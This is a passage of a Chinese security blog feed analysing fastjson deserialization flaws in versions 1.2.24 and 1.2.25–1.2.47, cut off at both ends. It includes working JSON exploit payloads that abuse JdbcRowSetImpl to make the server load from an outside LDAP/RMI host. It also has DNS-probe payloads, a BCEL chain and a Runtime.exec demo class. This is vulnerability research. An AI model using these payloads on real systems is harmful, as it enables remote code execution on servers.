class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader) &#123;</span><br><span class="line">    <span class="keyword">if</span> (className == <span class="keyword">null</span> || className.length() == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Class&lt;?&gt; clazz = mappings.get(className);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (className.charAt(<span class="number">0</span>) == <span class="string">&#x27;[&#x27;</span>) &#123;</span><br><span class="line">        Class&lt;?&gt; componentType = loadClass(className.substring(<span class="number">1</span>), classLoader);</span><br><span class="line">        <span class="keyword">return</span> Array.newInstance(componentType, <span class="number">0</span>).getClass();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (className.startsWith(<span class="string">&quot;L&quot;</span>) &amp;&amp; className.endsWith(<span class="string">&quot;;&quot;</span>)) &#123;</span><br><span class="line">        String newClassName = className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> loadClass(newClassName, classLoader);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (classLoader != <span class="keyword">null</span>) &#123;</span><br><span class="line">            clazz = classLoader.loadClass(className);</span><br><span class="line">            mappings.put(className, clazz);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">        <span class="comment">// skip</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (contextClassLoader != <span class="keyword">null</span> &amp;&amp; contextClassLoader != classLoader) &#123;</span><br><span class="line">            clazz = contextClassLoader.loadClass(className);</span><br><span class="line">            mappings.put(className, clazz);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">        <span class="comment">// skip</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        clazz = Class.forName(className);</span><br><span class="line">        mappings.put(className, clazz);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">        <span class="comment">// skip</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> clazz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此处加载了var参数对应的类，并放到了<code>TypeUtils</code>的<code>mappings</code>中，把我们的目标类添加成了一个内置类，且在加载的过程中并没有对黑名单进行过滤！</p><div align=center><img src="/img/fastjson 1.2.25-1.2.47漏洞分析/10.png" alt="10" style="zoom:50%;" /></div><p>第二次<code>@type</code>进入<code>checkAutoType</code>，如果没有指定 autoTypeSupport，则通过</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TypeUtils.getClassFormMapping(<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>)</span><br></pre></td></tr></table></figure><p>可以直接获取到通过<code>java.lang.Class</code>加载并缓存的<code>com.sun.rowset.JdbcRowSetImpl</code>类</p><div align=center><img src="/img/fastjson 1.2.25-1.2.47漏洞分析/11.png" alt="11" style="zoom:50%;" /></div><h3 id="2-3-Poc"><a href="#2-3-Poc" class="headerlink" title="2.3 Poc"></a>2.3 Poc</h3><h4 id="2-3-1-JdbcRowSetImpl的两个写法"><a href="#2-3-1-JdbcRowSetImpl的两个写法" class="headerlink" title="2.3.1 JdbcRowSetImpl的两个写法"></a>2.3.1 JdbcRowSetImpl的两个写法</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &#123;&quot;@type&quot;: &quot;java.lang.Class&quot;, &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125;:&quot;x&quot;, </span><br><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;dataSourceName&quot;</span>: <span class="string">&quot;ldap://9ktn7r.ai.haibara.cyou/1&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;autoCommit&quot;</span>:<span class="literal">true</span>;</span><br><span class="line">&#125;:&quot;y&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是这里需要注意：如果开发设置了<code>ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</code>，则会直接进入<code>denyList</code>进行检测，<br>因此这里需要整理两个Poc进行检测，防止目标开启了<code>ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</code></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">## poc1</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;dataSourceName&quot;</span>: <span class="string">&quot;rmi://dnslog.cn&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;autoCommit&quot;</span>: <span class="string">&quot;true&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">## poc2  这个poc对应着目标开启 ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</span><br><span class="line">&#123;</span><br><span class="line">  &#123;&quot;@type&quot;: &quot;java.lang.Class&quot;, &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125;:&quot;x&quot;, </span><br><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;dataSourceName&quot;</span>: <span class="string">&quot;ldap://9ktn7r.ai.haibara.cyou/1&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;autoCommit&quot;</span>: <span class="string">&quot;true&quot;</span>;</span><br><span class="line">&#125;:&quot;y&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">## 结合Class的poc也可以自己随意组合，只要保证先使用java.lang.Class加载需要的类即可</span><br><span class="line">##  poc3</span><br><span class="line">&#123;</span><br><span class="line">  &#123;&quot;@type&quot;: &quot;java.lang.Class&quot;, &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125;:&#123;</span><br><span class="line">  &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">    &quot;dataSourceName&quot;: &quot;ldap://9ktn7r.ai.haibara.cyou/1&quot;,</span><br><span class="line">    &quot;autoCommit&quot;: &quot;true&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">## poc4</span><br><span class="line">[</span><br><span class="line">  &#123;<span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Class&quot;</span>, <span class="attr">&quot;val&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>&#125;, </span><br><span class="line">  &#123;</span><br><span class="line">  <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;dataSourceName&quot;</span>: <span class="string">&quot;ldap://9ktn7r.ai.haibara.cyou/1&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;autoCommit&quot;</span>: <span class="string">&quot;true&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>实际检测利用链时，从</strong><code>poc1、poc3、poc4</code><strong>中选取一个检测一下，如果不行再用</strong><code>poc2</code><strong>检测一下</strong></p><h4 id="2-3-2-BCEL利用链"><a href="#2-3-2-BCEL利用链" class="headerlink" title="2.3.2 BCEL利用链"></a>2.3.2 BCEL利用链</h4><p>此时BCEL利用链仍然是不能用的，我们尝试先试用<code>java.lang.Class</code>去加载必要的两个类</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  [&#123;&quot;@type&quot;: &quot;java.lang.Class&quot;, &quot;val&quot;:&quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;&#125;, &#123;&quot;@type&quot;: &quot;java.lang.Class&quot;, &quot;val&quot;:&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;&#125;]:&#123;</span><br><span class="line">     &quot;x&quot;:&#123;</span><br><span class="line">             &quot;@type&quot;: &quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;,                </span><br><span class="line">         &quot;driverClassLoader&quot;: &#123;</span><br><span class="line">                 &quot;@type&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;               </span><br><span class="line">                     &#125;,</span><br><span class="line">             &quot;driverClassName&quot;: &quot;BCELPayload&quot; &#125;</span><br><span class="line"> &#125;: &quot;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调试发现<code>org.apache.tomcat.dbcp.dbcp.BasicDataSource</code>是可以加载的，但是<code>com.sun.org.apache.bcel.internal.util.ClassLoader</code>由于是字段值，将通过<code>JavaBeanDeserializer</code>去反序列化处理，而在该类中，<code>checkAutoType</code>是传入的<code>expectClass</code></p><div align=center><img src="/img/fastjson 1.2.25-1.2.47漏洞分析/12.png" alt="12" style="zoom:50%;" /></div><p>因此在<code>checkAutoType</code>方法中，会先进入对类名的黑名单判断，导致<code>com.sun.org.apache.bcel.internal.util.ClassLoader</code>匹配黑名单报错<br>!</p><div align=center><img src="/img/fastjson 1.2.25-1.2.47漏洞分析/13.png" alt="13" style="zoom:50%;" /></div><p>那如果将<code>com.sun.org.apache.bcel.internal.util.ClassLoader</code>构造成<code>Lcom.sun.org.apache.bcel.internal.util.ClassLoader;</code>呢，这样黑名单是可以过去的，但是下面有专门针对<code>ClassLoader</code>和<code>DataSource</code>类型进行判断，并抛出异常</p><div align=center><img src="/img/fastjson 1.2.25-1.2.47漏洞分析/14.png" alt="14" style="zoom:50%;" /></div><p><strong>所以暂时BCEL只能在1.2.24中使用</strong></p><h2 id="3-总结"><a href="#3-总结" class="headerlink" title="3. 总结"></a>3. 总结</h2><p>通过测试+对比代码</p><ul><li>手动开启<code>ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</code> ，结合<code>L+类名+;</code>绕过的方式，适用版本 <code>1.2.25-1.2.41</code>，但是这取决于目标环境是否手动开启了<code>AutoTypeSupport</code></li><li>通过<code>java.lang.Class</code>绕过<code>autoTypeSupport</code>，适用版本 <code>&lt;=1.2.47</code><h3 id="2-1-1-2-42的修复"><a href="#2-1-1-2-42的修复" class="headerlink" title="2.1 1.2.42的修复"></a>2.1 1.2.42的修复</h3>修改fastjson为1.2.42，调试进入<code>checkAutoType</code>方法，可以看到，这里先对<code>Lxxxx;</code>进行过滤，再进行黑名单的判断</li></ul><div align=center><img src="/img/fastjson 1.2.25-1.2.47漏洞分析/15.png" alt="15" style="zoom:50%;" /></div>]]></content>
      
      
      <categories>
          
          <category> 攻防研究 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞分析 </tag>
            
            <tag> fastjson </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>fastjson 1.2.24漏洞分析</title>
      <link href="/2022/11/11/fastjson%201.2.24%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>/2022/11/11/fastjson%201.2.24%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<pre><code>  通过fastjson解析json字符串的流程得知：`@type`对应类名，通过获取`setXxx`或`set_Xxx`方法，对应`xxx`属性，先创建一个类对象，再通过invoke调用`setXxx`方法进行赋值</code></pre><h2 id="1-模拟命令执行"><a href="#1-模拟命令执行" class="headerlink" title="1. 模拟命令执行"></a>1. 模拟命令执行</h2><p>因此只需要找到一个setXxx中存在代码执行的类构造利用链，比如下面这个示例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> vuln.POJO;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">evilClass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//恶意代码</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(name);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> vuln;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> vuln.POJO.evilClass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">poc_1_2_24</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String poc = <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;vuln.POJO.evilClass\&quot;,\&quot;name\&quot;:\&quot;open /System/Applications/Calculator.app\&quot;&#125;&quot;</span>;</span><br><span class="line">        evilClass object = (evilClass)JSON.parse(poc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><div align=center><img src="/img/fastjson 1.2.24漏洞分析/1.png" alt="1" style="zoom:50%;" /></div><h2 id="2-利用链"><a href="#2-利用链" class="headerlink" title="2. 利用链"></a>2. 利用链</h2><h3 id="2-1-DNS请求"><a href="#2-1-DNS请求" class="headerlink" title="2.1 DNS请求"></a>2.1 DNS请求</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.net.Inet4Address&quot;</span>,<span class="attr">&quot;val&quot;</span>:<span class="string">&quot;dnslog&quot;</span>&#125;</span><br><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.net.InetSocketAddress&quot;</span>&#123;<span class="attr">&quot;address&quot;</span>:,<span class="attr">&quot;val&quot;</span>:<span class="string">&quot;dnslog&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure><h4 id="2-1-1-java-net-Inet4Address"><a href="#2-1-1-java-net-Inet4Address" class="headerlink" title="2.1.1 java.net.Inet4Address"></a>2.1.1 java.net.Inet4Address</h4><p>直接看<code>java.net.Inet4Address</code>类，并没有找到属性值；通过调试发现，该类并没有走之前那个流程，他的<code>deserializer</code>是系统中默认就有的<br>于是查看<code>getDeserializer</code>方法，进入<code>this.derializers.get(type);</code>中，遍历所有内置映射好的类；发现其中就包括<code>java.net.Inet4Address</code></p><div align=center><img src="/img/fastjson 1.2.24漏洞分析/2.png" alt="2" style="zoom:50%;" /></div><h4 id="2-1-2-补充-内置有deserializer对应的类名"><a href="#2-1-2-补充-内置有deserializer对应的类名" class="headerlink" title="2.1.2 补充-内置有deserializer对应的类名"></a>2.1.2 补充-内置有deserializer对应的类名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">java.util.concurrent.atomic.AtomicBoolean</span><br><span class="line">com.alibaba.fastjson.JSONObject</span><br><span class="line">byte</span><br><span class="line">java.sql.Date</span><br><span class="line">java.lang.StringBuilder</span><br><span class="line">java.lang.Double</span><br><span class="line">java.sql.Timestamp</span><br><span class="line">java.lang.Cloneable</span><br><span class="line">java.lang.StackTraceElement</span><br><span class="line">java.math.BigDecimal</span><br><span class="line">boolean</span><br><span class="line">java.util.UUID</span><br><span class="line">java.net.URI</span><br><span class="line">java.util.TimeZone</span><br><span class="line">java.util.Map</span><br><span class="line">java.math.BigInteger</span><br><span class="line">java.lang.Long</span><br><span class="line">java.lang.Class</span><br><span class="line">java.io.Closeable</span><br><span class="line">[C</span><br><span class="line">java.io.File</span><br><span class="line">char</span><br><span class="line">java.net.InetSocketAddress</span><br><span class="line">double</span><br><span class="line">java.util.concurrent.atomic.AtomicLong</span><br><span class="line">java.io.Serializable</span><br><span class="line">com.alibaba.fastjson.JSONPath</span><br><span class="line">java.util.concurrent.ConcurrentHashMap</span><br><span class="line">java.util.concurrent.atomic.AtomicReference</span><br><span class="line">java.lang.Integer</span><br><span class="line">java.util.Date</span><br><span class="line">java.util.ArrayList</span><br><span class="line">java.util.Locale</span><br><span class="line">java.lang.Boolean</span><br><span class="line">java.lang.Number</span><br><span class="line">java.util.List</span><br><span class="line">java.util.Currency</span><br><span class="line">java.net.Inet6Address</span><br><span class="line">java.lang.Short</span><br><span class="line">java.util.concurrent.atomic.AtomicLongArray</span><br><span class="line">java.util.concurrent.ConcurrentMap</span><br><span class="line">java.net.Inet4Address</span><br><span class="line">java.util.Collection</span><br><span class="line">java.util.Calendar</span><br><span class="line">java.lang.ref.SoftReference</span><br><span class="line">int</span><br><span class="line">javax.xml.datatype.XMLGregorianCalendar</span><br><span class="line">java.util.regex.Pattern</span><br><span class="line">java.net.InetAddress</span><br><span class="line">short</span><br><span class="line">java.util.concurrent.atomic.AtomicInteger</span><br><span class="line">com.alibaba.fastjson.JSONArray</span><br><span class="line">java.nio.charset.Charset</span><br><span class="line">java.util.LinkedHashMap</span><br><span class="line">java.util.TreeMap</span><br><span class="line">long</span><br><span class="line">java.lang.StringBuffer</span><br><span class="line">java.lang.Comparable</span><br><span class="line">java.text.SimpleDateFormat</span><br><span class="line">float</span><br><span class="line">java.sql.Time</span><br><span class="line">java.lang.ref.WeakReference</span><br><span class="line">java.lang.String</span><br><span class="line">java.util.HashMap</span><br><span class="line">java.lang.Character</span><br><span class="line">java.lang.Byte</span><br><span class="line">java.lang.Object</span><br><span class="line">java.lang.Float</span><br><span class="line">java.util.concurrent.atomic.AtomicIntegerArray</span><br><span class="line">java.net.URL</span><br></pre></td></tr></table></figure><p>获取到的类为<code>MiscCodec</code>，因此反序列化的方法在 <code>com.alibaba.fastjson.serializer#deserialze</code>中</p><ul><li>如下图中，当类是<code>InetSocketAddress</code>时，会单独处理</li><li>会判断参数是否为<code>val</code>，然后进入<code>parse.parse()</code>解析流程</li></ul><div align=center><img src="/img/fastjson 1.2.24漏洞分析/3.png" alt="3" style="zoom:50%;" /></div><p>如图，在解析过程中，判断了类的类型，进入<code>InetAddress.getName(strVal)</code>中</p><div align=center><img src="/img/fastjson 1.2.24漏洞分析/4.png" alt="4" style="zoom:50%;" /></div><h4 id="2-1-2-补充-Inet4Address解析域名"><a href="#2-1-2-补充-Inet4Address解析域名" class="headerlink" title="2.1.2 补充-Inet4Address解析域名"></a>2.1.2 补充-Inet4Address解析域名</h4><p>a. <code>InetAddress.getAllByName</code></p><div align=center><img src="/img/fastjson 1.2.24漏洞分析/a.png" alt="a" style="zoom:50%;" /></div><p>b. 判断是否为IP地址</p><div align=center><img src="/img/fastjson 1.2.24漏洞分析/b.png" alt="b" style="zoom:50%;" /></div><p>c. 判断cache中是否有缓存的域名解析地址，如果没有，则通过<code>getAddressesFromNameService</code>解析</p><div align=center><img src="/img/fastjson 1.2.24漏洞分析/c.png" alt="c" style="zoom:50%;" /></divc<p>d. 接下来<code>lookupAllHostAddr</code>中就是一些解析域名的操作，先不跟入了</p><div align=center><img src="/img/fastjson 1.2.24漏洞分析/d.png" alt="d" style="zoom:50%;" /></div><h4 id="2-1-4-java-net-URL"><a href="#2-1-4-java-net-URL" class="headerlink" title="2.1.4 java.net.URL"></a>2.1.4 java.net.URL</h4><p>查看<code>MiscCodec</code>反序列化工具类，针对URL类的实例化处理只是<code>new URL</code>，那怎么触发DNS请求呢</p><div align=center><img src="/img/fastjson 1.2.24漏洞分析/5.png" alt="5" style="zoom:50%;" /></div><p><strong>没有思路的时候，可能是因为没有将反序列化流程完全分析到</strong></p><ul><li>首先在创建<code>DefaultJSONParser</code>时，将Set取出，并指定对应的token值</li><li>然后在paser方法时，进入指定的<code>SET</code>分支，进入<code>parseArray</code>方法</li><li>其中<code>[]</code>中<code>@type</code>对应的解析方法和之前一样是<code>parseObject(object, i);</code></li></ul><div align=center><img src="/img/fastjson 1.2.24漏洞分析/6.png" alt="6" style="zoom:50%;" /></div>完成`@type`的反序列化操作后，进行`HashSet.add`操作<div align=center><img src="/img/fastjson 1.2.24漏洞分析/7.png" alt="7" style="zoom:50%;" /></div>`HashSet.add`<div align=center><img src="/img/fastjson 1.2.24漏洞分析/8.png" alt="8" style="zoom:50%;" /></div>`HashMap.put`<div align=center><img src="/img/fastjson 1.2.24漏洞分析/9.png" alt="9" style="zoom:50%;" /></div>`key(java.net.URL对象).hashCode()`<div align=center><img src="/img/fastjson 1.2.24漏洞分析/10.png" alt="10" style="zoom:50%;" /></div>这里就执行到`java.net.URL.hashCode`方法，这样就触发了域名解析；记得不太清楚了，似乎和`readObject`反序列化中的`URLDNS`利用链相似<div align=center><img src="/img/fastjson 1.2.24漏洞分析/11.png" alt="11" style="zoom:50%;" /></div>由于整个解析流程，类似于流式结构，因此没有最后一个`]`闭合`Set`也是可以的<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;http://dnslog&quot;&#125;]</span><br><span class="line">Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;http://dnslog&quot;&#125;</span><br></pre></td></tr></table></figure><p>同理，还有两个使用<code>parseArray</code>的解析流程，参照<code> com.alibaba.fastjson.parser.JSONLexerBase#nextToken</code>及<code>scanIdent</code>方法，对应<code>TreeSet</code> 和 []，但是他们对应的是<code>TreeSet</code>和<code>JSONArray</code>；如TreeSet的add方法，会执行<code>Compara</code>方法，需要实现<code>Comparable</code>类，并运行<code>Comparable.compareTo</code>方法，这里想到了<code>readObject CB</code>利用链，暂时放着。</p><div align=center><img src="/img/fastjson 1.2.24漏洞分析/12.png" alt="12" style="zoom:50%;" /></div><h4 id="2-1-5-poc构造"><a href="#2-1-5-poc构造" class="headerlink" title="2.1.5 poc构造"></a>2.1.5 poc构造</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.net.InetAddress&quot;</span>,<span class="attr">&quot;val&quot;</span>:<span class="string">&quot;dnslog&quot;</span>&#125;</span><br><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.net.Inet4Address&quot;</span>,<span class="attr">&quot;val&quot;</span>:<span class="string">&quot;dnslog&quot;</span>&#125;</span><br><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.net.Inet6Address&quot;</span>,<span class="attr">&quot;val&quot;</span>:<span class="string">&quot;dnslog&quot;</span>&#125;</span><br><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.net.InetSocketAddress&quot;</span>&#123;<span class="attr">&quot;address&quot;</span>:,<span class="attr">&quot;val&quot;</span>:<span class="string">&quot;dnslog&quot;</span>&#125;&#125;</span><br><span class="line">Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;http://dnslog&quot;&#125;]</span><br></pre></td></tr></table></figure><h3 id="2-2-TemplatesImpl利用链"><a href="#2-2-TemplatesImpl利用链" class="headerlink" title="2.2 TemplatesImpl利用链"></a>2.2 TemplatesImpl利用链</h3><h4 id="2-2-1-注意私有字段的赋值"><a href="#2-2-1-注意私有字段的赋值" class="headerlink" title="2.2.1 注意私有字段的赋值"></a>2.2.1 注意私有字段的赋值</h4><p>默认通过反射进行复制是不能使用私有字段的，此时需要在反序列化时加上<code>Feature.SupportNonPublicField</code>，因此这种利用链不一定在所有的场景都可以用</p><div align=center><img src="/img/fastjson 1.2.24漏洞分析/13.png" alt="13" style="zoom:50%;" /></div><h4 id="2-2-2-数组类型的变量"><a href="#2-2-2-数组类型的变量" class="headerlink" 